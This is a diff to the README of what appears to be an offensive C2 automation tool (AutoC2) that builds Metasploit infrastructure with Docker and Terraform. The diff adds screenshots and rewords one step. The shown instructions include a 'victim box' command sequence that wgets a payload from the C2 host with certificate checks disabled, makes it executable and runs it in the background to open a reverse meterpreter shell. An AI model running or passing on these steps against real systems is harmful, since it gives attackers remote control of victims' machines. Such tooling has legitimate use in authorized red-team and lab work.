@@ -86,17 +86,21 @@ sudo docker container exec -it msf /bin/bash
 ./msfconsole -r docker_delivery.rc
 
 ```
+![AutoC2](/demo_screenshots/AutoC2_2.PNG)
+![AutoC2](/demo_screenshots/AutoC2_3.PNG)
+
 * By default it generates payload for linux x64 systems.can be modified for different target by modifying **docker_delivery.rc** file
 
 *  By default docker_delivery.rc uses certificate picked up automatically by metasploit.
 
-* On a **victim box**, execute the following to get reverse meterpreter shell.
+* On a **victim box**, execute the following to get reverse meterpreter shell on attacker msf container.
 
 ```bash
 wget --no-check-certificate https://c2IP/delivery
 chmod +x delivery
 ./delivery&
 ```
+![AutoC2](/demo_screenshots/Auto_victim1.PNG)
 * Finally to destroy the infrastructure completely(use this with caution!) use the following command :
 ```bash
 terraform destroy
